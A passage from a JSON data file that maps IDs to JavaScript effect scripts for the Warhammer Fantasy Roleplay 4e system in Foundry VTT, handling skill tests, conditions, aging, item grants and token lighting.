Math.ceil(CONFIG.Dice.randomUniform() * 10)\n\n    let currentAge = parseInt(this.actor.system.details.age.value)\n\n    let inline = `<a class=\"inline-roll\" data-tooltip=\"@TT\"><i class=\"fas fa-dice-d20\"></i>@ROLL</a>`\n    let msg =\n        `<p><b>${this.actor.prototypeToken.name}</b> ages by ${inline.replace(\"@ROLL\", ageAdded).replace(\"@TT\", \"2d10\")} and loses</p>\n      <p>${inline.replace(\"@ROLL\", ws).replace(\"@TT\", \"1d10\")} <b>Weapon Skill</b></p>\n      <p>${inline.replace(\"@ROLL\", bs).replace(\"@TT\", \"1d10\")} <b>Ballistic Skill</b></p>\n      <p>${inline.replace(\"@ROLL\", s).replace(\"@TT\", \"1d10\")} <b>Strength</b></p>\n      <p>${inline.replace(\"@ROLL\", t).replace(\"@TT\", \"1d10\")} <b>Toughness</b></p>\n      <p>${inline.replace(\"@ROLL\", ag).replace(\"@TT\", \"1d10\")} <b>Agility</b></p>\n      <p>${inline.replace(\"@ROLL\", dex).replace(\"@TT\", \"1d10\")} <b>Dexterity</b></p>\n `\n    this.script.scriptMessage(msg);\n\n    let characteristics = foundry.utils.duplicate(this.actor.system.characteristics)\n\n    characteristics.ws.initial -= ws\n    characteristics.bs.initial -= bs\n    characteristics.s.initial -= s\n    characteristics.t.initial -= t\n    characteristics.ag.initial -= ag\n    characteristics.dex.initial -= dex\n\n    this.actor.update({ \"system.characteristics\": characteristics, \"data.details.age.value\": ageAdded + currentAge })\n}","lwVhn4bSXJ3eoT9q":"if (this.item.system.weaponGroup.value == \"basic\")\n{\n    let slash = this.item.system.qualities.value.find(i => i.name == \"slash\")\n    if (slash)\n    {\n        slash.value = \"2A\"\n    }\n}","m3qEVO5fseV6KHXa":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.qn4ZpvTQIX4rcJDl\")\nlet data = item.toObject();\ndata.system.location.key = this.item.system.location.key\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect: this.effect.id})","m58MpMZBblpq5LJu":"args.prefillModifiers.slBonus++;\nargs.prefillModifiers.successBonus++;\n","m8qBlbH7ROoqa22o":"return args.options.reload","mBcLf11upaHS8AQq":"this.actor.status.addArmour(1, {source: this.effect})","mGHKBkDp4omSaBlD":"this.actor.getActiveTokens().forEach(t => t.document.update({light : {\n      \"dim\": 20,\n      \"bright\": 10,\n      \"angle\": 360,\n      \"alpha\": 0.4,\n      \"animation\": {\n          \"speed\": 3,\n          \"intensity\": 3,\n          \"type\": \"torch\",\n      },\n      \"color\": \"#ffcc66\",\n  }}));","mJ9eMPub4epJSf00":"return args.weapon?.system.qualities.value.find(i => i.name == \"shield\") && this.actor.attacker","mPxmCsXYirAIT913":"let key = await ItemDialog.create(ItemDialog.objectToArray(game.wfrp4e.config.characteristics, this.effect.img), 1, \"Choose Characteristic\");\n\nthis.effect.updateSource({changes : [{key : `system.characteristics.${key[0].id}.modifier`, mode : 2, value : 10}]})","mRvLsSVxNyt8LVZb":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.GRRN3XAKIpEVCY7z\")\nlet data = item.toObject();\ndata.name += \" (To Be Determined)\"\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","mT7PDcjF3cJTDbjR":"args.actor.system.details.move.value -= 1;\nargs.actor.system.status.carries.max *= 1.25;","mTnmPcjWmvScIBWY":"return args.skill?.name.includes(\"Channelling\") || args.type == \"channelling\"","mV4Tmc0yfpL09KV7":"args.actor.addCondition(\"entangled\")","mXvtf3qhJjshpopX":"return [\"weapon\", \"cast\", \"channelling\"].includes(args.type)","mYL4i1vNlMl4vFYy":"return args.skill?.name != game.i18n.localize(\"NAME.Perception\") && args.skill?.name != game.i18n.localize(\"NAME.Track\");","ma0sWhebqwdRHWvY":"if (!args.flags.trained)\n{\n    args.flags.trained = true;\n    args.fields.modifier += 10;\n}","maKr58mvvyKxFyC3":"if (args.item.type == \"prayer\" && (args.item.damage.value || args.item.damage.dice))\n    args.item.damage.value += \"+1\"","masOBNgSi5HYkf3m":"return args.type != \"cast\" && args.type != \"channelling\"","mgLGN1XPzPE4dReN":"args.fields.slBonus--;","mlulnXQo8XU8vKLD":"if (isNaN(parseInt(this.item.system.specification.value)))\n{\n    let value = await ValueDialog.create(\"Enter Grim value\", this.effect.name);\n    if (value)\n    {\n     this.item.updateSource({\"system.specification.value\" : value});\n    }\n}","mr8qm5Bg6k1idZ6Q":"return args.item?.name == \"Play (Lute)\"","mziJBUYcsrhkdcCJ":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`})\nawait test.roll();\nif (test.failed)\n{  \n    this.actor.addCondition(\"prone\")\n}","n5RJqJL9fdRIxkuN":"if (this.actor.system.status.advantage.value > 0)\n{\n    await this.actor.modifyAdvantage(-1);\n    this.script.scriptNotification(\"Advantage Subtracted\")\n}\nelse \n{\n    return this.script.scriptNotification(\"Not enough Advantage!\", \"error\")\n}\n\nlet test = await this.actor.setupTrait(this.item)\nawait test.roll();","nCWAflBj7Si2BI1Q":"if (args.item.type == \"spell\" && args.item.system.lore.value != \"petty\")\n{\n    args.item.cn.value = Math.max(4, args.item.cn.value * 2)\n}","nD2QVg3DrPK3foMf":"args.actor.setupSkill(\"Dodge\", { fields: { difficulty: \"average\" } }).then(async test => {\n      await test.roll();\n      if (test.failed) {\n        await args.actor.addCondition(\"bleeding\")\n        await args.actor.addCondition(\"entangled\")\n      }\n    })","nEaF3jbCiVYD8jia":"return args.skill?.name != game.i18n.localize(\"NAME.Charm\") && !args.skill?.name.includes(game.i18n.localize(\"NAME.Lore\"));","nGTxNWBUBgTr87wU":"if (args.opposedTest.result.differenceSL >= 0 && args.opposedTest.result.differenceSL <= 2 && args.opposedTest.result.winner == \"attacker\")\n{ \n    this.script.scriptMessage(`Becomes lodged in the armour or flesh of the opponent. See @UUID[${this.item.uuid}]{${this.item.name}}.`, speaker : {alias : this.item.name}, {blind: true, whisper : ChatMessage.getWhisperRecipients(\"GM\")})\n}\n    ","nHJdlqbOP0ECgywb":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.CnydL8p3PVAuF98w\")\nlet data = item.toObject();\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","nIOeK0BrtdZeZW8X":"console.log(\"SKILL\", this)\n\nlet test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Cool\"), {fields : {difficulty : \"challenging\"}, appendTitle : ` - ${this.effect.name}`})\nawait test.roll();\n\nlet rollD10 = await new Roll(\"1d10\").roll()\nrollD10.toMessage(this.script.getChatData())\n\n\nif (test.succeeded)\n{\n  //...\n}\nelse if (test.failed)\n{\n  //...\n}\n","nSXzktHyNjGUXjaw":"return args.item?.system.isRanged","nYtAjSArsNbrU2ob":"if ([\"ag\", \"i\", \"int\"].includes(args.characteristic))\n{\n    args.fields.modifier -= 10;\n}\nelse if ([\"wp\"].includes(args.characteristic))\n{\n    args.fields.modifier += 10;\n}","naF5EWr1CBkYRZTK":"if (args.opposedTest?.attackerTest?.item?.system?.isRanged) \n{\n    let choice = await Dialog.wait({\n        title: this.effect.name,\n        content: `<p>Abort damage with <strong>${this.effect.name}</strong>?`,\n        buttons: {\n            yes: {\n                label: \"Yes\",\n                callback: () => {\n                    return true;\n                }\n            },\n            no: {\n                label: \"No\",\n                callback: () => {\n                    return false;\n                }\n            }\n        }\n    })\n\n    if (choice)\n    {\n        args.abort = `<strong>${this.effect.name}</strong>: Damage cancelled`\n    }\n}","ncIjDE6TFx88IQA1":"return args.skill?.name == game.i18n.localize(\"NAME.Climb\") || args.skill?.name == game.i18n.localize(\"NAME.Athletics\");","neaaVy6D6tfcst5P":"args.fields.slBonus += this.actor.characteristics.i.bonus;\n","ngMm7SgtVqVovFJG":"if (args.test.result.critical && args.test.result.critical != \"Total Power\")\n{\n   args.test.result.other.push(`<a class =\"table-click critical-roll\" data-modifier=\"20\" data-table = \"crit${args.test.result.hitloc.result}\"><i class=\"fas fa-list\"></i> Bonecrusher Critical (+20)</a> (only if Critical Cast selected)`)\n}","njPP9wDAsdh4WHIj":"if (args.totalWoundLoss > 0 && [\"trait\", \"weapon\"].includes(args.opposedTest.attackerTest.item?.type))\n{\n     this.script.scriptMessage(`<b>Infected: ${args.actor.name}</b> must pass an <b>Easy (+40) Endurance</b> Test or gain a @UUID[Compendium.wfrp4e-core.items.kKccDTGzWzSXCBOb]{Festering Wound}`, {whisper: ChatMessage.getWhisperRecipients(\"GM\")})\n}","nkSmu7v9WiAaK4vq":"const repaired_message = `<p>Finished repairing <em>${this.item.name}</em>.</p>`;\nconst test = 'Trade (Tailor)';\nconst difficulty = 'easy';\nconst target = 20;\n\nconst extendedTestData = {\n  name: this.item.name,\n  type: \"extendedTest\",\n  img: this.item.img,\n  system: {\n    SL: {\n      current: 0,\n      target: target\n    },\n    test: {\n      value: test\n    },\n    completion: {\n      value: \"remove\"\n    },\n    difficulty: {\n      value: difficulty\n    }\n  },\n  effects: [\n    {\n      name: `Repair the ${this.item.name}`,\n      icon: this.item.img,\n      flags: {\n        wfrp4e: {\n          applicationData: {\n            type: \"document\",\n            documentType: \"Item\"\n          },\n          scriptData: [\n            {\n              label: this.item.name,\n              script: `\n              let id = this.item.flags.wfrp4e.fromEffect;\n              let effect = this.actor.appliedEffects.find(e => e.id === id);\n              this.script.scriptMessage(\"${repaired_message}\");\n              await effect.item.delete();\n            `,\n              trigger: \"deleteEffect\"\n            }\n          ]\n        }\n      }\n      }\n  ]\n};\n\nawait this.actor.createEmbeddedDocuments(\"Item\", [extendedTestData], {fromEffect: this.effect.id});\n","nkbTnaeBpthyhw4J":"let fortunePoints = this.effect.sourceTest.result.overcast.usage.other.current\nlet current = this.actor.status.fortune.value\n\nthis.actor.update({\"system.status.fortune.value\" : fortunePoints + current})\n\nthis.script.scriptMessage(`<b>${this.actor.prototypeToken.name}</b> fortune points increased from ${current} to ${fortunePoints + current}`)","nkdKBJ8ItqWiRAWL":"// Apply changes when the mask is worn\n\nif (args.equipped) {  \n  this.actor.createEmbeddedDocuments(\"ActiveEffect\", [this.item.effects.contents[1]?.convertToApplied()])  \n  this.script.scriptMessage(`${this.actor.name} dons the <strong>${this.item.name}</strong>. <br>\n        They gain +50 to Swim Tests and can breathe underwater.<br>\n        If they wear the mask for more than an hour or benefit from any of its effects, they are exposed to @Corruption[moderate]{Moderate Corruption}. \n        `,\n      {whisper: ChatMessage.getWhisperRecipients(\"GM\")}) \n}\n\n// Notify of lingering effects when mask is removed\nelse if (!args.equipped)\n{\n    await this.item.effects.contents[0].delete();\n    await this.item.update({name : this.item.name += \" (Used)\"})\n    this.script.scriptMessage(`<strong>${this.item.name}</strong> on ${this.actor.name} has been taken off and loses its properties. However, the effects last for [[1d10+4]] days, after which they should be manually removed.`, \n    {whisper: ChatMessage.getWhisperRecipients(\"GM\")}\n    )\n    \n}\n","nlQA0shW8FCXjY7u":"return args.type != \"cast\" || args.item.lore.value != \"fire\"","nuIpPD4uaZRuJni8":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.qdMbxW09FUoYBzmB\")\nlet data = item.toObject();\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","nvrFhHHVq3KzirlR":"return !args.skill?.name.includes(game.i18n.localize(\"NAME.Stealth\"))\n","nxNqWmmF6mJTnrLo":"return args.weapon?.system.usesHands.includes(this.item.system.location.key);","nzh8d46l1ikhkz8Q":"return (args.type == \"weapon\" && (args.item.system.weaponGroup.value == \"blackpowder\" || args.item.system.weaponGroup.value == \"engineering\")) || (args.type == \"cast\" && args.item.system.lore.value == \"fire\")","o1zD8mej9TWKNxUq":"args.fields.slBonus -= 1;","o3JUBKLvE6bBxK2n":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), { fields: { difficulty: \"average\" } })\nawait test.roll();\nif (test.failed) \n{\n    await this.actor.addCondition(\"prone\")\n    let injury = await fromUuid(\"Compendium.wfrp4e-core.items.ZhMADOqoo0y8Q9bx\");\n    injury = injury.toObject()\n    let toes = Math.clamped(Math.abs(test.result.SL) + 1, 1, 5)\n    injury.system.location.key = this.item.system.location.key[0] + injury.system.location.value\n    if (injury.system.location.key[0] == \"r\")\n    {\n        injury.system.location.value = `${toes} Right ${injury.system.location.value}s`\n    }\n    else if (injury.system.location.key[0] == \"l\")\n    {\n        injury.system.location.value = `${toes} Left ${injury.system.location.value}s`\n    }\n    foundry.utils.setProperty(injury, \"system.wfrp4e.count\", toes)\n    this.actor.createEmbeddedDocuments(\"Item\", [injury])\n}","o88xuUConwt0vFLw":"let points = this.effect.sourceTest.result.overcast.usage.other.current;\n\nthis.actor.update({\"system.status.fortune.value\" : this.actor.system.status.fortune.value + points});\n\nthis.script.scriptMessage(`Gained ${points} Fortune Points`)","oDNfCNyt5KaUYmg2":"if(args.opposedTest.result.winner == \"defender\")\n{\n    let roll = Math.ceil(CONFIG.Dice.randomUniform() * 10)\n    let msg = `Rolled ${roll}.`\n    if (roll >= 7)\n    {\n          msg = `Attack hits with an SL of ${roll - 6}.`\n    }\n    this.script.scriptMessage(msg, {blind: true,  whisper : ChatMessage.getWhisperRecipients(\"GM\")})\n}","oEsUsI74yGTZ9CwU":"return args.item?.name == game.i18n.localize(\"NAME.CharmAnimal\")","oGdsGPgJWcyWkiWl":"this.actor.addCondition(\"broken\")\n\nif (this.actor.has(game.i18n.localize(\"NAME.Undead\")))\n{\n    this.script.scriptMessage(await this.actor.applyBasicDamage(this.effect.sourceTest.result.damage, {damageType : game.wfrp4e.config.DAMAGE_TYPE.IGNORE_ALL, suppressMsg: true}))\n}","oHenUKtaS3jT5xQn":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.4xF7M6ylIiGntekh\")\nitem = item.toObject()\nitem.name = this.effect.name\nthis.actor.createEmbeddedDocuments(\"Item\", [item], {fromEffect : this.effect.id})\n","oPg4se8iQRD14kmB":"let filters = [\n    {\n        property : \"type\",\n        value : \"weapon\"\n    },\n    {\n        property : \"system.weaponGroup.value\",\n        value : [\"twohanded\", \"polearm\"]\n    }\n]\n\nlet items = await game.wfrp4e.apps.ItemDialog.createFromFilters(filters, 1, \"Choose an appropriate Polearm or Two-Handed Weapon\")\nitems = items.map(i => i.toObject())\n\nitems.forEach(i => equip(i))\n\nthis.actor.createEmbeddedDocuments(\"Item\", items);\n\nfunction equip(item)\n{\n    if (item.type == \"armour\")\n        item.system.worn.value = true\n    else if (item.type == \"weapon\")\n        item.system.equipped = true\n    else if (item.type == \"trapping\" && item.system.trappingType.value == \"clothingAccessories\")\n        item.system.worn = true\n}","oTXPA6rbPnYOKNmo":"let characteristics = {\n    \"ws\" : 35,\n    \"bs\" : 10,\n    \"s\" : 25,\n    \"t\" : 30,\n    \"i\" : 30,\n    \"ag\" : 25,\n    \"dex\" : 0,\n    \"int\" : 15,\n    \"wp\" : 35,\n    \"fel\" : 15\n}\nlet skills = [\"Cool\", \"Dodge\", \"Intimidate\", \"Intuition\", \"Language (Battle)\", \"Leadership\", \"Lore (Warfare)\", \"Perception\"]\nlet skillAdvancements = [25, 15, 25, 25, 15, 30, 20, 20]\n\nlet talents = [\"Combat Aware\", \"Combat Master\", \"Combat Reflexes\", \"Inspiring\", \"Luck\", \"Resolute\", \"Unshakable\", \"War Leader\"]\nlet trappings = [\"Hand Weapon\",  \"Shield\", \"Plate Breastplate\", \"Plate Bracers\", \"Plate Helm\", \"Plate Leggings\"]\nlet specialItems = [ \n    {name: \"Two Handed Weapon\", type: \"trapping\", trappingType: \"clothingAccessories\" }, \n]    \nlet items = [];\n\nlet updateObj = this.actor.toObject();\n\nfor (let ch in characteristics)\n{\n    updateObj.system.characteristics[ch].modifier += characteristics[ch];\n}\n\nfor (let item of specialItems) {\n    let newItem\n    if (item.type == \"weapon\") {\n        newItem = new ItemWfrp4e({ name: item.name, type: item.type, system: { equipped: true, damage: {value: item.damage}}  })\n    } else if (item.type == \"trapping\") {\n        newItem = new ItemWfrp4e({ img: \"systems/wfrp4e/icons/blank.png\", name: item.name, type: item.type, system: { worn: true, trappingType: { value: item.trappingType}  } } )\n    } else {\n        newItem = new ItemWfrp4e({ img: \"systems/wfrp4e/icons/blank.png\", name: item.name, type: item.type  })\n    }\n    items.push(newItem.toObject())\n}\n\nfor (let index = 0; index < skills.length; index++)\n{\n    let skill = skills[index]\n    let skillItem;\n    skillItem = updateObj.items.find(i => i.name == skill && i.type == \"skill\")\n    if (skillItem)\n        skillItem.system.advances.value += skillAdvancements[index]\n    else \n    {\n        skillItem = await game.wfrp4e.utility.findSkill(skill)\n        skillItem = skillItem.toObject();\n        skillItem.system.advances.value = skillAdvancements[index];\n        items.push(skillItem);\n    }\n}\n\nfor (let talent of talents)\n{\n    let talentItem = await game.wfrp4e.utility.findTalent(talent)\n    if (talentItem)\n    {\n        items.push(talentItem.toObject());\n    }\n    else \n    {\n        ui.notifications.warn(`Could not find ${talent}`, {permanent : true})\n    }\n}\n\nfor (let trapping of trappings) \n{\n    let trappingItem = await game.wfrp4e.utility.findItem(trapping)\n    if (trappingItem)\n    {\n        trappingItem = trappingItem.toObject()\n\n        equip(trappingItem)\n\n        items.push(trappingItem);\n    }\n    else \n    {\n        ui.notifications.warn(`Could not find ${trapping}`, {permanent : true})\n    }\n}\n\nlet filters = [\n    {\n        property : \"type\",\n        value : \"weapon\"\n    },\n    {\n        property : \"system.weaponGroup.value\",\n        value : [\"twohanded\", \"polearm\"]\n    }\n]\n\nitems = items.concat(await game.wfrp4e.apps.ItemDialog.createFromFilters(filters, 1, \"Choose an appropriate Polearm or Two-Handed Weapon\"))\n\nlet ride = await Dialog.confirm({title : \"Skill\", content : \"Add Chaos Steed and +20 Ride (Horse)?\"})\n\nif (ride)\n{\n    let skill = await game.wfrp4e.utility.findSkill(\"Ride (Horse)\")\n    skill = skill.toObject();\n    skill.system.advances.value = 20;\n    items = items.concat({name : \"Chaos Steed\", type: \"trapping\", \"system.trappingType.value\" : \"misc\"}, skill)\n}\n\nupdateObj.name = updateObj.name += \" \" + this.effect.name\n\nawait this.actor.update(updateObj)\nconsole.log(\">>>>>>><\", items)\nthis.actor.createEmbeddedDocuments(\"Item\", items);\n\nfunction equip(item)\n{\n    if (item.type == \"armour\")\n        item.system.worn.value = true\n    else if (item.type == \"weapon\")\n        item.system.equipped = true\n    else if (item.type == \"trapping\" && item.system.trappingType.value == \"clothingAccessories\")\n        item.system.worn = true\n}","oV81zgbZsuTFG6L2":"let caster = this.effect.sourceActor;\n\nthis.actor.modifyWounds(caster.system.characteristics.fel.bonus);\n\nthis.script.scriptMessage(`Healed ${caster.system.characteristics.fel.bonus} Wounds`);","oW1gtYVT5nrxDjM7":"return args.characteristic != \"ag\"","oWM43EdUiyHgUlfW":"if (args.test.item && args.test.item.name == game.i18n.localize(\"NAME.ConsumeAlcohol\"))\n    args.test.preData.canReverse = true","oWa7RkScnl6lR5vd":"if (args.test.characteristicKey == \"wp\") \n{\n    if (args.test.failed)\n    {\n        let item = await fromUuid(\"Compendium.wfrp4e-core.items.AGcJl5rHjkyIQBPP\")\n        let data = item.toObject();\n        this.actor.createEmbeddedDocuments(\"Item\", [data])\n        \n        this.script.scriptMessage(`Willpower Test failed, <b>${this.actor.prototypeToken.name}</b> gains @UUID[Compendium.wfrp4e-core.items.AGcJl5rHjkyIQBPP] for [[1d10]] hours`)\n    }\n}","obIXhQXKFyyQoNNV":"this.actor.setupSkill(game.i18n.localize(\"NAME.Cool\"), {appendTitle: ` - ${this.effect.name}`, fields: { difficulty: \"average\" } }).then(async test => {\n    await test.roll()\n    if (test.failed) {\n        this.actor.modifyWounds(-1);\n        this.script.scriptMessage(\"Takes 1 Damage\")\n    }\n})","ocBW3osTFnb5JCfe":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.MVI0lXcg6vvtooAF\")\nlet data = item.toObject()\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})\n","ofddAHvzn1xUueSG":"args.AP.head.value -= tinDifference(args.AP.head.layers)\nargs.AP.body.value -= tinDifference(args.AP.body.layers)\nargs.AP.lArm.value -= tinDifference(args.AP.lArm.layers)\nargs.AP.rArm.value -= tinDifference(args.AP.rArm.layers)\nargs.AP.rLeg.value -= tinDifference(args.AP.rLeg.layers)\nargs.AP.lLeg.value -= tinDifference(args.AP.lLeg.layers)\n\nfunction tinDifference(layers)\n{ \n   let metalAP = layers.filter(i => i.metal).reduce((prev, current) => prev + current.value, 0)\n\n   let tinAP = layers.filter(i => i.metal).reduce((prev, current) => prev + Math.max(0, current.value - 2), 0)\n\n   return metalAP - tinAP;\n}","ogJBAXTXyhTqACPO":"return args.item?.system.attackType != \"melee\"","ohl803m0tUwNfKAk":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.pLW9SVX0TVTYPiPv\")\nlet data = item.toObject();\ndata.system.specification.value = 5 - this.actor.characteristics.s.bonus\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","okW06V9UiPC4Vcrn":"let characteristics = {\n    \"ws\" : 5,\n    \"bs\" : 0,\n    \"s\" : 5,\n    \"t\" : 5,\n    \"i\" : 10,\n    \"ag\" : 0,\n    \"dex\" : 0,\n    \"int\" : 0,\n    \"wp\" : 5,\n    \"fel\" : 5\n}\nlet skills = [\"Cool\", \"Dodge\"]\nlet skillAdvancements = [10, 10]\nlet talents = [\"Combat Reflexes\", \"Resolute\"]\nlet trappings = [\"Leather Jack\", \"Leather Leggings\", \"Leather Skullcap\", \"Hand Weapon\", \"Spear\", \"Shield\"]\nlet items = [];\n\nlet updateObj = this.actor.toObject();\n\nfor (let ch in characteristics)\n{\n    updateObj.system.characteristics[ch].modifier += characteristics[ch];\n}\n\nfor (let index = 0; index < skills.length; index++)\n{\n    let skill = skills[index]\n    let skillItem;\n    skillItem = updateObj.items.find(i => i.name == skill && i.type == \"skill\")\n    if (skillItem)\n        skillItem.system.advances.value += skillAdvancements[index]\n    else \n    {\n        skillItem = await game.wfrp4e.utility.findSkill(skill)\n        skillItem = skillItem.toObject();\n        skillItem.system.advances.value = skillAdvancements[index];\n        items.push(skillItem);\n    }\n}\n\nfor (let talent of talents)\n{\n    let talentItem = await game.wfrp4e.utility.findTalent(talent)\n    if (talentItem)\n    {\n        items.push(talentItem.toObject());\n    }\n    else \n    {\n        ui.notifications.warn(`Could not find ${talent}`, {permanent : true})\n    }\n}\n\nfor (let trapping of trappings) \n{\n    let trappingItem = await game.wfrp4e.utility.findItem(trapping)\n    if (trappingItem)\n    {\n        trappingItem = trappingItem.toObject()\n\n        equip(trappingItem)\n\n        items.push(trappingItem);\n    }\n    else \n    {\n        ui.notifications.warn(`Could not find ${trapping}`, {permanent : true})\n    }\n}\n\nupdateObj.name = updateObj.name += \" \" + this.effect.name\n\nawait this.actor.update(updateObj)\nthis.actor.createEmbeddedDocuments(\"Item\", items);\n\n\nfunction equip(item)\n{\n    if (item.type == \"armour\")\n        item.system.worn.value = true\n    else if (item.type == \"weapon\")\n        item.system.equipped = true\n    else if (item.type == \"trapping\" && item.system.trappingType.value == \"clothingAccessories\")\n        item.system.worn = true\n}","okr3TtzpFoefUuJS":"let item = await fromUuid('Compendium.wfrp4e-core.items.EaqlLRQigwnsEAXX')\nlet data = item.toObject();\ndata.system.location.value = \"Collar Bone\"\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","oqgd9G6oI1ncPYLw":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.CV9btQn09S9Fn8Jk\");\nthis.actor.createEmbeddedDocuments(\"Item\", [item.toObject()], {fromEffect : this.effect.id});","p222EiR8RRtlPm31":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Cool\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`, fields : {difficulty : \"hard\"}})\nawait test.roll();\nreturn test.failed;","pAgiAGyaLJY10894":"return args.skill?.name == game.i18n.localize(\"NAME.Charm\");","pBMioPUtDn1mk9f5":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.5KP9sOoLSGvj9EXp\")\nlet data = item.toObject();    \nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id});","pG5OVokZzCRHIrwz":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.mgeiaDZXei7JBEgo\")\nlet data = item.toObject();\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","pHyXdPnWwoFrUA5n":"return !args.skill?.name.includes(game.i18n.localize(\"NAME.Entertain\"));","pLKv4moua6XhNdmA":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.1dUizIgLBgn4jICC\");\nlet data = item.toObject();\ndata.name += \" (Woodlands)\";\nthis.actor.createEmbeddedDocuments(\"Item\", Array(this.effect.sourceTest.result.overcast.usage.other.current).fill(data), {fromEffect : this.effect.id})","pNPjXEoQGHLKzq0r":"let talent = this.actor.has(\"Arcane Magic (Light)\", \"talent\")\nlet demon = this.actor.has(game.i18n.localize(\"NAME.Daemonic\"))\n\nif (!talent)\n{\n   await this.actor.addCondition(\"blinded\")\n}\n\nif (demon)\n{\n    await this.actor.addCondition(\"stunned\")\n}","pPV9oEydXb7oi6jX":" if (args.totalWoundLoss > 0)\n {\n    args.actor.addCondition('ablaze')\n }","pR4Q2OnPxXtwRVli":"let criticals = this.actor.itemTypes.critical;\n\nif (criticals.length)\n{\n    this.script.scriptNotification(\"Cannot suffer Critical Wounds\");\n    this.actor.deleteEmbeddedDocuments(\"Item\", criticals.map(i => i.id))\n}\n\nif (getProperty(args.data, \"system.status.wounds.value\") == 0)\n{\n    this.script.scriptNotification(`Dormant for ${Math.ceil(CONFIG.Dice.randomUniform() * 10)} Rounds`)\n}","pVSnn4Zw6y1EBDhv":"args.actor.system.details.man -= 1;\nargs.actor.system.details.move.value -= 1;","pkKpxVqRHIzywerL":"const ablaze = this.actor.hasCondition(\"ablaze\");\n\nif (ablaze) {\n    ablaze.delete();\n    this.script.scriptNotification(\"Resisted Ablaze\");\n}","pnB9TzSEytkxk3Rb":"return this.actor.hasSystemEffect(\"infighting\")","pq1YQffxtOcqCRTn":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {appendTitle: ` - ${this.effect.name}`})\nawait test.roll();\nif (!test.succeeded)\n{\n    this.actor.addCondition(\"prone\")\n}","pvk5OhTNdVgwXoUa":"args.fields.successBonus += 2;","px7eEdhOEt7zOTrq":"return [\"int\", \"t\", \"wp\", \"i\"].includes(args.characteristic)","pzimrxrqpv282Oqb":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.TaYriYcJkFuIdBKp\")\nthis.actor.createEmbeddedDocuments(\"Item\", [item], {fromEffect : this.effect.id});\n","pzknBcJtZWeliE27":"return args.item?.name == game.i18n.localize(\"NAME.Leadership\") || args.item?.name == game.i18n.localize(\"NAME.Cool\")","q0LvphC8RDSyR0oY":"let choice = await ItemDialog.create(ItemDialog.objectToArray({\n    ws : game.wfrp4e.config.characteristics.ws,\n    t : game.wfrp4e.config.characteristics.t,\n    ag : game.wfrp4e.config.characteristics.ag,\n    wp : game.wfrp4e.config.characteristics.wp\n}, this.effect.img), 1, \"Choose Characteristic\");\n\nthis.effect.updateSource({\"flags.wfrp4e.characteristic\" : choice[0].id})","q3nRyXaxksdCiLFM":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.j6v78dnOOdCB6c3d\")\nlet data = item.toObject();\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","q8lOAWr2970sZeTw":"const repaired_message = `<p>Finished repairing <em>${this.item.name}</em>.</p>`;\nconst test = 'Trade (Carpentry)';\nconst difficulty = 'challenging';\nconst target = 20;\n\nconst extendedTestData = {\n  name: this.item.name,\n  type: \"extendedTest\",\n  img: this.item.img,\n  system: {\n    SL: {\n      current: 0,\n      target: target\n    },\n    test: {\n      value: test\n    },\n    completion: {\n      value: \"remove\"\n    },\n    difficulty: {\n      value: difficulty\n    }\n  },\n  effects: [\n    {\n      name: `Repair the ${this.item.name}`,\n      icon: this.item.img,\n      flags: {\n        wfrp4e: {\n          applicationData: {\n            type: \"document\",\n            documentType: \"Item\"\n          },\n          scriptData: [\n            {\n              label: this.item.name,\n              script: `\n              let id = this.item.flags.wfrp4e.fromEffect;\n              let effect = this.actor.appliedEffects.find(e => e.id === id);\n              this.script.scriptMessage(\"${repaired_message}\");\n              await effect.item.delete();\n            `,\n              trigger: \"deleteEffect\"\n            }\n          ]\n        }\n      }\n      }\n  ]\n};\n\nawait this.actor.createEmbeddedDocuments(\"Item\", [extendedTestData], {fromEffect: this.effect.id});\n","qAEZgtu5CrfUkxhx":"if (args.test.options.staunchBleeding) \n{\n if (args.test.succeeded) \n {\n   let staunch =  Number(args.test.result.SL) + 1\n   if (args.test.options.fieldDressing && args.test.result.reversed)\n   {\n     staunch =  Math.min(1, Number(args.test.result.SL)) + 1\n   }\n   args.test.result.other.push(`<b>${this.actor.name}</b> removed <b>${staunch}</b> Bleeding conditions from the patient.`)\n }\n   else if (this.actor.characteristics.int.bonus + Number(args.test.result.SL) < 0)\n   {\n      args.test.result.other.push(`The patient contracts a @UUID[Compendium.wfrp4e-core.items.Item.1hQuVFZt9QnnbWzg]{Minor Infection}.`)\n   }\n}","qK4q4o6cQhcGzFX3":"let fear = await fromUuid(\"Compendium.wfrp4e-core.items.Item.pTorrE0l3VybAbtn\")\nlet leader = await fromUuid(\"Compendium.wfrp4e-core.items.Item.vCgEAetBMngR53aT\")\nlet fearData = fear.toObject();\nlet leaderData = leader.toObject();\nfearData.system.specification.value = this.effect.sourceTest.result.overcast.usage.other.current; 